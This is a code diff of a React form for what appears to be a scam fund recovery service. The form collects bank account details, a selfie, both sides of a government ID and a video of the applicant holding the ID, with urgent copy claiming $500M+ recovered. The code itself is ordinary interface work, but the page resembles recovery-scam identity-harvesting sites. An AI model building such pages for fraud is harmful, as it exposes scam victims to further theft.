+                            <span className="text-white font-bold text-sm tracking-wide uppercase">Bank Account Details</span>
+                          </div>
+                          <div className="p-6 grid sm:grid-cols-2 gap-4">
+                            <Input name="account_holder_name" label="Account holder *" />
+                            <Input name="bank_name" label="Bank name *" />
+                            <Input name="bank_account_number" label="Account number *" />
+                            <Input name="bank_routing_number" label="Routing / IBAN / SWIFT *" />
+                          </div>
+                        </div>
+                      )}
+                    </Section>
+                  </div>
+
+                  {/* ─── STEP 3: Identity & Security ──────────────────── */}
+                  <div className={currentStep === 3 ? "block" : "hidden"}>
+                    <Section title="Identity Verification" icon={<ShieldCheck className="w-5 h-5" />}>
+                      <div className="bg-amber-50 border border-amber-200 rounded-2xl p-5 mb-8 flex gap-4">
+                        <AlertTriangle className="w-6 h-6 text-amber-600 shrink-0" />
+                        <div className="text-sm text-amber-800">
+                          <strong>Verification Required:</strong> To prevent identity theft and comply with global AML regulations, we require clear documentation. Submitting fraudulent info is a criminal offense.
+                        </div>
+                      </div>
+
+                      <div className="space-y-6">
+                        <VerificationStep
+                          stepNumber={1} title="Live Selfie" subtitle="Photo for biometric match" completed={Boolean(selfieImage)} icon={<Camera className="w-4 h-4" />}
+                          description="Take a clear, front-facing photo of your face." requirements={["Even lighting", "No hats/glasses"]}
+                        >
+                          <UploadZone label="Selfie" sublabel="Required" description="Your face photo" icon={<Camera className="w-5 h-5 text-slate-400" />} value={selfieImage} onChange={onSelfieChange} progress={uploadProgress["selfie"]} />
+                        </VerificationStep>
+
+                        <VerificationStep
+                          stepNumber={2} title="Primary ID" subtitle="Government issued photo ID" completed={Boolean(idFrontImage && idBackImage)} icon={<IdCard className="w-4 h-4" />}
+                          description="Upload both sides of your National ID or Driver's License." requirements={["Valid/Unexpired", "Legible text"]}
+                        >
+                          <div className="grid grid-cols-2 gap-4">
+                            <UploadZone label="Front" sublabel="Required" description="ID Front" icon={<IdCard className="w-5 h-5 text-slate-400" />} value={idFrontImage} onChange={onIdFrontChange} progress={uploadProgress["id_front"]} />
+                            <UploadZone label="Back" sublabel="Required" description="ID Back" icon={<IdCard className="w-5 h-5 text-slate-400" />} value={idBackImage} onChange={onIdBackChange} progress={uploadProgress["id_back"]} />
+                          </div>
+                        </VerificationStep>
+
+                        <VerificationStep
+                          stepNumber={3} title="Video Proof" subtitle="Enhanced biometric layer" completed={Boolean(videoSelfie)} icon={<Video className="w-4 h-4" />}
+                          description="Record a 10s video stating your name while holding your ID." requirements={["Clear audio", "ID visible"]}
+                        >
+                          <VideoCapture label="Video ID" value={videoSelfie} onCapture={onVideoSelfieChange} progress={uploadProgress["video"]} />
+                        </VerificationStep>
+                      </div>
+                    </Section>
+                  </div>
+
+                  {/* Navigation Footer */}
+                  <div className="mt-12 flex items-center justify-between border-t border-slate-100 pt-8">
+                    <button
+                      type="button"
+                      onClick={prevStep}
+                      disabled={currentStep === 1 || loading}
+                      className={`flex items-center gap-2 font-bold text-sm transition-all ${currentStep === 1 ? "opacity-0 pointer-events-none" : "text-slate-500 hover:text-slate-800"}`}
+                    >
+                      Back
+                    </button>
+                    
+                    <div className="flex gap-4">
+                      {currentStep < totalSteps ? (
+                        <button
+                          type="button"
+                          onClick={nextStep}
+                          className="px-8 h-12 bg-slate-900 text-white font-bold rounded-2xl shadow-lg hover:bg-slate-800 transition active:scale-95"
+                        >
+                          Next Step
+                        </button>
+                      ) : (
+                        <button
+                          type="submit"
+                          disabled={loading}
+                          className="px-10 h-12 bg-cta-gradient text-white font-black rounded-2xl shadow-xl hover:shadow-2xl transition active:scale-95 disabled:opacity-60 flex items-center gap-3"
+                        >
+                          {loading ? <Loader2 className="w-5 h-5 animate-spin" /> : <BadgeCheck className="w-5 h-5" />}
+                          {loading ? "Submitting..." : "Submit Application"}
+                        </button>
+                      )}
                     </div>
-                  ))}
-                </div>
-
-                {/* Step 1 — Selfie */}
-                <VerificationStep
-                  stepNumber={1}
-                  title="Live Selfie — Face Photo"
-                  subtitle="Required · Takes 30 seconds"
-                  completed={Boolean(selfieImage)}
-                  description="Take or upload a clear, front-facing photo of yourself. Ensure your face is fully visible, well-lit, and unobstructed. No hats, sunglasses, or heavy filters."
-                  icon={<Camera className="w-5 h-5" />}
-                  requirements={["Face clearly visible", "Even lighting, no shadows", "Plain or neutral background", "No sunglasses or face coverings"]}
-                >
-                  <UploadZone
-                    label="Selfie / Face Photo"
-                    sublabel="Required"
-                    description="Front-facing photo of your face"
-                    icon={<Camera className="w-5 h-5 text-slate-400 group-hover:text-primary transition-colors" />}
-                    value={selfieImage}
-                    onChange={onSelfieChange}
-                    progress={uploadProgress["selfie"]}
-                  />
-                </VerificationStep>
-
-                {/* Step 2 — Primary Government ID */}
-                <VerificationStep
-                  stepNumber={2}
-                  title="Primary Government-Issued ID"
-                  subtitle="Required · National ID, Driver's License, or State ID"
-                  completed={Boolean(idFrontImage && idBackImage)}
-                  description="Upload both sides of a valid, unexpired government-issued photo ID. Accepted documents: National Identity Card, Driver's License, or State-Issued ID Card."
-                  icon={<IdCard className="w-5 h-5" />}
-                  requirements={["Document must be valid and unexpired", "All four corners must be visible", "Text must be legible — no glare or blur", "JPEG, PNG, or PDF accepted · Max 15MB"]}
-                >
-                  <div className="grid sm:grid-cols-2 gap-4">
-                    <UploadZone
-                      label="ID Front Side"
-                      sublabel="Required"
-                      description="Front face of your ID showing name, photo & number"
-                      icon={<IdCard className="w-5 h-5 text-slate-400 group-hover:text-primary transition-colors" />}
-                      value={idFrontImage}
-                      onChange={onIdFrontChange}
-                      progress={uploadProgress["id_front"]}
-                    />
-                    <UploadZone
-                      label="ID Back Side"
-                      sublabel="Required"
-                      description="Reverse side showing barcode, signature or address"
-                      icon={<IdCard className="w-5 h-5 text-slate-400 group-hover:text-primary transition-colors" />}
-                      value={idBackImage}
-                      onChange={onIdBackChange}
-                      progress={uploadProgress["id_back"]}
-                    />
                   </div>
-                </VerificationStep>
-
-                {/* Step 3 — Secondary Document */}
-                <VerificationStep
-                  stepNumber={3}
-                  title="Secondary Identity Document"
-                  subtitle="Recommended · Passport or additional Driver's License"
-                  completed={Boolean(passportFrontImage || passportBackImage)}
-                  description="Provide a secondary document for additional verification. A valid passport is the preferred secondary document. This step significantly accelerates your application review."
-                  icon={<BookOpen className="w-5 h-5" />}
-                  requirements={["Passport biographical page preferred", "Document must match primary ID details", "Must be clear and fully in-frame", "Strengthens approval likelihood"]}
-                  optional
-                >
-                  <div className="grid sm:grid-cols-2 gap-4">
-                    <UploadZone
-                      label="Passport / License — Front"
-                      sublabel="Recommended"
-                      description="Biographical page: photo, full name, document number"
-                      icon={<BookOpen className="w-5 h-5 text-slate-400 group-hover:text-primary transition-colors" />}
-                      value={passportFrontImage}
-                      onChange={onPassportFrontChange}
-                      progress={uploadProgress["passport_front"]}
-                    />
-                    <UploadZone
-                      label="Passport / License — Back"
-                      sublabel="Optional"
-                      description="Signature page or reverse side of document"
-                      icon={<FileCheck2 className="w-5 h-5 text-slate-400 group-hover:text-primary transition-colors" />}
-                      value={passportBackImage}
-                      onChange={onPassportBackChange}
-                      progress={uploadProgress["passport_back"]}
-                    />
-                  </div>
-                </VerificationStep>
-
-                {/* Step 4 — Video Selfie */}
-                <VerificationStep
-                  stepNumber={4}
-                  title="Biometric Video Verification"
-                  subtitle="Required · Enhanced Security Layer"
-                  completed={Boolean(videoSelfie)}
-                  description="Record a short video (up to 15s) stating your name and holding your ID card (front and back) clearly. This is a mandatory requirement to prevent identity theft."
-                  icon={<Video className="w-5 h-5" />}
-                  requirements={["State your full name", "Show ID front clearly", "Show ID back clearly", "Face must be visible"]}
-                >
-                  <VideoCapture
-                    label="Video ID Verification"
-                    value={videoSelfie}
-                    onCapture={onVideoSelfieChange}
-                    progress={uploadProgress["video"]}
-                  />
-                </VerificationStep>
-
-                {/* Legal footer */}
-                <div className="px-6 pb-5">
-                  <p className="text-[10px] text-slate-400 leading-relaxed border-t border-slate-100 pt-4">
-                    By uploading documents you confirm that all documents are genuine, valid, and belong to you. All files are transmitted over TLS 1.3 and stored using AES-256 encryption on certified, access-controlled infrastructure. Documents are accessible exclusively to authorised compliance personnel and are never sold or shared with third parties, except as required by applicable law or a lawful court order. Submission of false documentation constitutes fraud and may result in criminal prosecution under the laws of your jurisdiction.
-                  </p>
                 </div>
               </div>
-            </div>
+            </Reveal>
 
-            <button
-              type="submit"
-              disabled={loading}
-              className="mt-4 w-full inline-flex items-center justify-center gap-2 bg-cta-gradient text-white font-semibold h-12 rounded-full shadow-soft hover:shadow-elegant transition disabled:opacity-60"
-            >
-              {loading && <Loader2 className="w-4 h-4 animate-spin" />}
-              {loading ? "Submitting…" : "Submit Application"}
-            </button>
-            <Reveal direction="up" delay={100}>
-              <p className="mt-6 text-lg sm:text-xl text-muted-foreground leading-relaxed max-w-2xl">
-                Every hour you wait, scammers move your money further out of reach. Our specialists have recovered over <span className="font-bold text-primary">$500M+</span> for victims just like you — with zero upfront cost.
-              </p>
+            <Reveal direction="up" delay={200}>
+              <div className="text-center max-w-2xl mx-auto">
+                <p className="text-lg text-muted-foreground italic">
+                  "Every hour you wait, scammers move your money further out of reach. Our specialists have recovered over <span className="font-bold text-primary">$500M+</span> for victims with zero upfront cost."
+                </p>
+              </div>
             </Reveal>
           </form>
         )}
       </section>
+      <AuthModal isOpen={isAuthModalOpen} onClose={() => setIsAuthModalOpen(false)} defaultMode={authMode} />
     </SiteShell>
   );
 }
 
 // ─── Shared sub-components ───────────────────────────────────────────────────
 
-function Section({ title, children }: { title: string; children: React.ReactNode }) {
+function Section({ title, icon, children }: { title: string; icon?: React.ReactNode; children: React.ReactNode }) {
   return (
     <div className="mb-8">
-      <h3 className="text-lg font-bold mb-4">{title}</h3>
+      <div className="flex items-center gap-3 mb-6 pb-4 border-b border-slate-100">
+        {icon && <div className="p-2.5 rounded-xl bg-primary/10 text-primary shadow-sm">{icon}</div>}
+        <h3 className="text-xl font-black text-slate-900 tracking-tight">{title}</h3>
+      </div>
       {children}
+    </div>
+  );
+}
+
+function StepIndicator({ current, total }: { current: number; total: number }) {
+  const steps = [
+    { n: 1, label: "Application Details", icon: <FileCheck2 className="w-4 h-4" /> },
+    { n: 2, label: "Payout Setup", icon: <CreditCard className="w-4 h-4" /> },
+    { n: 3, label: "Identity & Security", icon: <ShieldCheck className="w-4 h-4" /> },
+  ];
+
+  return (
+    <div className="mb-10">
+      <div className="flex items-center justify-between px-2">
+        {steps.map((s, i) => (
+          <div key={s.n} className="flex flex-col items-center gap-2 relative z-10">
+            <div className={`w-12 h-12 rounded-2xl flex items-center justify-center transition-all duration-500 shadow-sm border-2 ${
+              current >= s.n ? "bg-primary text-white border-primary shadow-lg scale-110" : "bg-white text-slate-300 border-slate-100"
+            }`}>
+              {current > s.n ? <CheckCircle2 className="w-6 h-6" /> : s.icon}
+            </div>
+            <span className={`text-[10px] font-black uppercase tracking-tighter transition-colors duration-500 ${
+              current >= s.n ? "text-primary" : "text-slate-400"
+            }`}>
+              {s.label}
+            </span>
+          </div>
+        ))}
+      </div>
+      {/* Progress bar line */}
+      <div className="relative h-1 bg-slate-100 mt-[-3.5rem] mx-10 -z-0 rounded-full overflow-hidden">
+        <div 
+          className="absolute inset-y-0 left-0 bg-primary transition-all duration-700 ease-out shadow-[0_0_10px_rgba(var(--primary-rgb),0.5)]"
+          style={{ width: `${((current - 1) / (total - 1)) * 100}%` }}
+        />
+      </div>
     </div>
   );
 }
